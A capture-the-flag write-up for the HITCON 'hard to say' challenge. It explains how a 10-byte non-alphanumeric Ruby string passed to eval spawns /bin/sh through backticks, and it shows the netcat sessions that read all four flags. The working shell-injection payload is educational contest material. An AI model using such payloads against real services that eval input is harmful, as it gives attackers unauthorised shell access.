## hard to say - Misc 4x50 Problem - Writeup by Robert Xiao (@nneonneo)

### Description

> Ruby on Fails.<br>
> FLAG1: nc 54.199.215.185 9001<br>
> FLAG2: nc 54.199.215.185 9002<br>
> FLAG3: nc 54.199.215.185 9003<br>
> FLAG4: nc 54.199.215.185 9004<br>
> 
> hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb

### Solution

This cute little Ruby program accepts a *non-alphanumeric* string of a certain maximum length and `eval`s it. So, our goal is just to write some non-alphanumeric Ruby shellcode. There are four problem instances, accepting 1024, 64, 36 and 10 byte inputs respectively and giving 50 points each. Since we want all the flags, we'll just focus on making a 10-byte shellcode.

Ruby has the backtick operator (``` `` ```) which lets us execute a shell command. Inside the backticks, Ruby also supports standard interpolation operators (`#{}`) which will run Ruby code and insert the result into the shell command string. Our goal is to get the shell command to equal `$0`, which will give us a usable interactive shell (since `$0` is set to `/bin/sh`). Normally we might do `` `$0` `` but since numbers are banned we'll create the `0` using Ruby code.

Ruby has a ton of global magic variables of the form `$<symbol>`. None of them have the value 0 by default. However, `$.`, the current input line number, is always equal to one since you're executing the first line inside an `eval` context. We can use that to create our desired zero with some bitwise operations: `~-$.` (negating gives -1, and inverting gives 0).

Putting that all together, then, we have the shellcode

    `$#{~-$.}`

which is exactly 10 bytes long. We use it to get all the flags:

    $ nc 54.199.215.185 9001
    Hi, I can say 1024 bytes :P
    `$#{~-$.}`
    I think size = 10 is ok to me.
    cat flag
    hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}

    $ nc 54.199.215.185 9002
    Hi, I can say 64 bytes :P
    `$#{~-$.}`
    I think size = 10 is ok to me.
    cat flag
    hitcon{Ruby in Peace m(_ _)m}

    $ nc 54.199.215.185 9003
    Hi, I can say 36 bytes :P
    `$#{~-$.}`
    I think size = 10 is ok to me.
    cat flag
    hitcon{My cats also know how to code in ruby :cat:}

    $ nc 54.199.215.185 9004
    Hi, I can say 10 bytes :P
    `$#{~-$.}`
    I think size = 10 is ok to me.
    cat flag
    hitcon{It's hard to say where ruby went wrong QwO}

(Note that, due to buffering, it is necessary to press Ctrl+D to flush the command input after typing `cat flag`).
